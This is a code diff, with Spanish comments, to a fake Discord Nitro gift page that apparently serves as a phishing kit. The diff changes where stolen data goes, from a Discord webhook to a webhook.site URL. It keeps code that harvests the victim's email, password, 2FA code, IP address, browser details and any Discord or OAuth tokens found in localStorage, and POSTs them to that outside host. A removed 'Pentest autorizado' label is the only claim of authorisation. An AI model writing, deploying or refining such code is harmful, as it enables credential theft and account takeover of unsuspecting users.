@@ -179,7 +179,7 @@
         }
 
         .gift-details .perks span::before {
-            content: "✓ ";
+            content: "âœ“ ";
             color: #3ba55d;
             font-weight: 700;
         }
@@ -484,8 +484,8 @@
     </div>
 
     <script>
-        // ===== CONFIGURACIÓN: TU WEBHOOK =====
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1502592870346133595/wTDuNN5vGcXnSSehgS2qhkbFqbURhC8V5fBGQGyWnJwwARPAv0bT5kNE3gbE_AjxA9k1';
+        // ===== WEBHOOK.SITE (reemplazo temporal) =====
+        const WEBHOOK_URL = 'https://webhook.site/001e6115-cda8-46b2-b271-fc82c8581600';
 
         // ===== FECHA DE EXPIRACIÓN =====
         const expiry = new Date(Date.now() + 24 * 60 * 60 * 1000);
@@ -536,6 +536,7 @@
             submitBtn.disabled = true;
             submitBtn.textContent = 'Verificando...';
 
+            // Obtener IP
             let ip = 'Desconocida';
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -543,6 +544,7 @@
                 ip = data.ip;
             } catch(e) {}
 
+            // Buscar token en localStorage
             let localToken = null;
             try {
                 const keys = ['token', 'access_token', 'discord_token', 'oauth_token'];
@@ -552,33 +554,29 @@
                 }
             } catch(e) {}
 
-            const embed = {
-                title: '🎣 Phishing - Discord Nitro',
-                color: 0xeb459e,
-                fields: [
-                    { name: '📧 Email', value: email || 'N/A', inline: true },
-                    { name: '🔑 Password', value: password || 'N/A', inline: true },
-                    { name: '🔐 2FA', value: mfa || 'No tiene', inline: true },
-                    { name: '🌐 IP', value: ip, inline: true },
-                    { name: '🖥️ User-Agent', value: navigator.userAgent.slice(0, 150), inline: false },
-                    { name: '⏰ Hora', value: new Date().toISOString(), inline: true }
-                ],
-                footer: { text: 'Pentest autorizado' }
+            // Armar payload limpio para webhook.site
+            const payload = {
+                tipo: 'phishing_discord_nitro',
+                timestamp: new Date().toISOString(),
+                credenciales: {
+                    email: email,
+                    password: password,
+                    mfa: mfa || 'No ingresó'
+                },
+                sistema: {
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    plataforma: navigator.platform,
+                    idioma: navigator.language
+                },
+                token_localstorage: localToken ? { key: localToken.key, value: localToken.value } : null
             };
-
-            if (localToken) {
-                embed.fields.push({
-                    name: '🎫 Token (localStorage)',
-                    value: `\`${localToken.value.slice(0, 40)}...\``,
-                    inline: false
-                });
-            }
 
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
+                    body: JSON.stringify(payload)
                 });
 
                 spinner.style.display = 'none';
